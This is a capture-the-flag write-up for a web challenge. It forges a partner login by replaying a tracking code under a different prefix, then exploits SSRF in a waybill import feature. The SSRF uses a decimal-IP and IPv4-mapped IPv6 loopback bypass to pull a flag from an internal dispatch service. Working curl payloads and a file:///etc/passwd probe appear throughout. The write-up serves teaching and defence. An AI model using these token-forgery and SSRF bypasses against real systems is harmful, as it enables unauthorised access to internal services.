@@ -1,0 +1,254 @@
+Source locale : web/depart/writeup-THE-GATE.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# THE GATE — Northline Transit (Web, 70 pts, q:1)
+
+## Objective
+
+Reach the internal coordination service of Northline Transit — which is not
+exposed on the public partner portal — and retrieve the answer to question 1
+(the dispatch/coordination service). The submitted answer is intentionally not
+reproduced anywhere in this document.
+
+Initial state:
+
+- Target application: `http://172.28.38.2:8080` (instance IP varies).
+- Provided artefact: `recu_northline.png`, a receipt containing a tracking
+  reference and a QR code.
+- The public portal exposes a login form gated by a Northline "code", a partner
+  area, a documentation page, a waybill import form and a receipt image.
+
+## Reconnaissance
+
+### 1. The receipt and its QR code
+
+The receipt was decoded with `zbarimg`:
+
+```bash
+zbarimg --raw recu_northline.png
+```
+
+Output (single URL):
+
+```
+http://192.168.73.128:8182/track/TRK.89a68c336ddecef271c90619.<HEX_EXPURGE>
+```
+
+Two facts follow immediately:
+
+- the internal coordination service lives at `192.168.73.128:8182`, which is
+  **not** routed on the VPN (`AllowedIPs = 172.28.38.0/24`), so it cannot be
+  reached directly from the workstation;
+- the tracking code has the structure `PREFIX.identifier.integrity`.
+
+### 2. Code format and the prefix confusion
+
+`GET /documentation` describes the code format:
+
+- three segments separated by dots;
+- the first segment determines the service/access level;
+- the "historical gateway" computes the integrity segment from the registered
+  identifier.
+
+Because the integrity value is a function of the identifier alone, the same
+identifier/integrity pair can be replayed under a different prefix. The
+tracking code uses `TRK`; the partner portal expects `PRT`:
+
+```bash
+curl -s -c /tmp/cj -o /dev/null -w '%{http_code}\n' \
+  --data-urlencode 'code=PRT.89a68c336ddecef271c90619.<HEX_EXPURGE>' \
+  http://172.28.38.2:8080/login
+```
+
+Result: `302` (redirect to `/dashboard`).
+
+The resulting session cookie decodes to `{"partner":"partner-1042"}`, and the
+dashboard identifies the account as *Skarvik Marine Services*.
+
+Prefix probing confirmed the behaviour: `TRK` returns "Préfixe non autorisé
+pour l’accès partenaire." while unknown prefixes return "Le code de connexion
+est invalide ou expiré." — i.e. only `PRT` is a valid partner-facing prefix for
+this identifier.
+
+### 3. Portal enumeration
+
+Authenticated routes found by ffuf and manual browsing:
+
+- `/dashboard` — overview;
+- `/shipments` — 25 shipments (`NL-24-7K42`, `NL-24-4101` … `NL-24-4124`);
+- `/shipments/<ref>` — detail, with the note that coordination details are
+  restricted to the "équipes de répartition";
+- `/waybills` — waybill preparation, with a `source_url` import field;
+- `/partner-manual` — partner guide, states that the internal distribution
+  service is not exposed to partners.
+
+The dashboard also contains a flag-shaped "session identifier". This is a
+**decoy for question 1**: it is a different question's answer, not the
+coordination service. The coordination service must be reached through the
+import feature.
+
+### 4. The import feature is the SSRF entry point
+
+`/waybills` says:
+
+> Indiquez l’adresse du document de préparation fourni par votre système
+> partenaire. Les formats HTML et JSON sont acceptés.
+>
+> La passerelle récupère le contenu et affiche un aperçu.
+
+The server fetches `source_url` and renders the response body in a
+`<pre class="preview">` block. This is a server-side request forgery primitive.
+
+## Exploiting the import gateway
+
+### Failed paths (and why they failed)
+
+| Attempt | Result |
+| --- | --- |
+| `source_url=http://192.168.73.128:8182/` | `Adresse de préparation non reconnue.` |
+| `source_url=http://192.168.73.128:8182/track/TRK…` | same rejection |
+| `file:///etc/passwd`, `gopher://…`, `ftp://…` | same rejection |
+| `http://127.0.0.1:8081/` and `http://localhost:8081/` | same rejection (loopback blocked) |
+| `http://172.28.38.2:8080/…`, `http://example.com/` | same rejection |
+| array / duplicated / missing `source_url` field, JSON body | same rejection |
+
+Timing analysis was decisive: requests to a non-routable address
+(`http://10.255.255.1:81/`) hung until the client timeout, while requests to
+`192.168.73.128:8182` returned the rejection in ~0.25 s. The validator
+therefore performs a cheap syntactic/allowlist check **before** fetching:
+only the `http` scheme, only port **8081**, and it refuses literal loopback
+addresses. Port 8182 is rejected up front.
+
+The validation did not accept hostnames or ports outside this narrow rule, so
+the internal service had to be reached on the one allowed port — the local
+sidecar on `127.0.0.1:8081`.
+
+### Bypassing the loopback block
+
+The filter blocks the literal strings/addresses `127.0.0.1` and `localhost`
+but does not normalise the numeric IPv4 form. `127.0.0.1` in decimal is
+`2130706433`:
+
+```bash
+curl -s -b /tmp/cj \
+  --data-urlencode 'source_url=http://2130706433:8081/' \
+  http://172.28.38.2:8080/waybills
+```
+
+This returns `Le service distant a répondu avec le statut 404.` — the fetch
+succeeded, proving the sidecar is reachable.
+
+Equivalent bypass, IPv4-mapped IPv6:
+
+```bash
+--data-urlencode 'source_url=http://[::ffff:127.0.0.1]:8081/'
+```
+
+### Enumerating the internal API
+
+The sidecar roots does not serve a page, but it exposes an API description at
+`/docs`:
+
+```bash
+curl -s -b /tmp/cj \
+  --data-urlencode 'source_url=http://2130706433:8081/docs' \
+  http://172.28.38.2:8080/waybills
+```
+
+Preview content (JSON):
+
+```json
+{
+  "description": "Routage des expéditions et coordination des prises en charge",
+  "routes": [
+    {"description": "Retrouver une expédition et son opération", "method": "GET", "path": "/api/shipments/<reference>"},
+    {"description": "Consulter le dossier de coordination", "method": "GET", "path": "/api/operations/<operation_id>"},
+    {"description": "Historique des affectations", "method": "GET", "path": "/api/operations/<operation_id>/assignments"},
+    {"description": "Diagnostic de disponibilité de la passerelle", "method": "GET", "path": "/flag"}
+  ],
+  "service": "Northline Dispatch Service",
+  "version": "2.3"
+}
+```
+
+### Retrieving the coordination answer
+
+The dispatch service exposes a diagnostic route that returns the question-1
+answer:
+
+```bash
+curl -s -b /tmp/cj \
+  --data-urlencode 'source_url=http://2130706433:8081/flag' \
+  http://172.28.38.2:8080/waybills
+```
+
+The response preview contains:
+
+```json
+{"flag":"<redacted submitted answer>","service":"dispatch","status":"ok"}
+```
+
+The value was reported to the local CTFHUB hub with `agent_bridge.py` and is
+not reproduced here.
+
+## Reproducible validation
+
+1. Decode the receipt and note the tracking code:
+
+   ```bash
+   zbarimg --raw recu_northline.png
+   ```
+
+2. Log in by replaying the identifier/integrity pair with the `PRT` prefix:
+
+   ```bash
+   curl -s -c /tmp/cj -o /dev/null -w '%{http_code}\n' \
+     --data-urlencode 'code=PRT.<identifier>.<integrity>' \
+     http://<target>:8080/login
+   ```
+
+   Expect `302`.
+
+3. Confirm the loopback bypass reaches the sidecar:
+
+   ```bash
+   curl -s -b /tmp/cj --data-urlencode 'source_url=http://2130706433:8081/' \
+     http://<target>:8080/waybills | grep -o 'Le service distant a répondu avec le statut [0-9]*'
+   ```
+
+   Expect the `404` status message.
+
+4. Confirm the API description:
+
+   ```bash
+   curl -s -b /tmp/cj --data-urlencode 'source_url=http://2130706433:8081/docs' \
+     http://<target>:8080/waybills | grep -A2 'Northline Dispatch Service'
+   ```
+
+5. Retrieve the answer:
+
+   ```bash
+   curl -s -b /tmp/cj --data-urlencode 'source_url=http://2130706433:8081/flag' \
+     http://<target>:8080/waybills
+   ```
+
+   The JSON preview must contain `"service":"dispatch"` and `"status":"ok"`;
+   the `flag` field is the submitted answer.
+
+## Lessons learned
+
+- **Integrity is not bound to the prefix.** Deriving the integrity from the
+  identifier only makes the code format trivially upgradable: a public
+  tracking code becomes a partner credential by swapping `TRK` for `PRT`.
+- **Client-side-looking validation is server-side and narrow.** The import
+  validator only checked scheme, port and literal loopback strings; numeric IP
+  encodings and IPv4-mapped IPv6 addresses defeat string-based blocklists.
+- **Port restriction is not an SSRF defence.** Allowing only port 8081 was
+  intended to limit the feature to a local sidecar, but that sidecar itself
+  proxied the sensitive coordination API, so the restriction simply told the
+  attacker which door to open.
+- **Decoys exist.** The dashboard's flag-shaped identifier answers a different
+  question; the intended q:1 target is the internal dispatch service.
+- **Timing distinguishes validation from fetching.** The 30 s hang on a
+  blackholed address versus the 0.25 s rejection proved the check occurred
+  before any network call, which guided the bypass work.
